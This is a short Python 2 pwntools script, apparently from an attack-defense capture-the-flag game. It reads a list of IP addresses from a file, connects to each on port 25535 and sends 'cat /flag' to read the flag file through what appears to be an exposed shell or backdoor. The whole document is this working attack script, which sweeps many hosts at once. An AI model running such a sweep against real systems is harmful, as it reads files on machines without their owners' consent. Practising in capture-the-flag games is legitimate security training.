#!/usr/bin/python2
# coding: utf-8

from pwn import *

ips = []
with open('ip.txt', 'r') as f:
    ips = f.readlines()

for ip in ips:
    io = remote(ip, 25535)
    io.sendline('cat /flag')
    io.sendline('exit(0)')